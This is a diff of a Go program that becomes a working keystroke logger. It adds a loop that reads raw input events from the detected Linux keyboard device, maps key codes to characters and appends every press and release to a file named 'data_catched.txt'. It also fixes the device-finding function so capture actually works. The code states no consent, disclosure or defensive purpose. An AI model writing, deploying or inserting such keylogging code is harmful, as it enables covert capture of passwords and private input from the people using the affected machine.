@@ -13,36 +13,56 @@ import (
 	"unsafe"
 )
 
+type EventType uint16
+
 type InputEvent struct {
-	Time       syscall.Timeval
-	Type, Code uint16
-	Value      int32
+	Time  syscall.Timeval
+	Type  EventType
+	Code  uint16
+	Value int32
 }
 
 func main() {
 	log.SetFlags(log.Lshortfile)
+
+	f, err := os.OpenFile("data_catched.txt", os.O_RDWR|os.O_TRUNC|os.O_CREATE, 0666)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer f.Close()
+
 	keyobardPath, err := findKeyboardDevice()
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println(keyobardPath)
 
-	f, err := os.OpenFile(keyobardPath, os.O_RDONLY, os.ModeCharDevice)
-	if err != nil {
-		log.Fatal(err)
-	}
-	//	syscall.Open(keyobardPath, syscall.O_RDONLY, syscall.AF_KEY)
-	defer f.Close()
-
-	buffer := make([]byte, unsafe.Sizeof(InputEvent{}))
-
-	event := &InputEvent{}
-	err = binary.Read(bytes.NewBuffer(buffer), binary.LittleEndian, event)
+	k, err := os.OpenFile(keyobardPath, os.O_RDONLY, os.ModeCharDevice)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	fmt.Println(event)
+	defer k.Close()
+
+	for {
+		buffer := make([]byte, unsafe.Sizeof(InputEvent{}))
+
+		_, err = k.Read(buffer)
+		if err != nil {
+			break
+		}
+
+		event := &InputEvent{}
+		err = binary.Read(bytes.NewBuffer(buffer), binary.LittleEndian, event)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		if event.Value < 2 {
+			f.Write([]byte(keyCodeMap[event.Code]))
+			fmt.Printf("%v\n", keyCodeMap[event.Code])
+		}
+
+	}
 }
 
 func findKeyboardDevice() (string, error) {
@@ -61,5 +81,5 @@ func findKeyboardDevice() (string, error) {
 	if deviceName == "" {
 		return "", errors.New("keyboard not found")
 	}
-	return "", nil
+	return deviceName, nil
 }
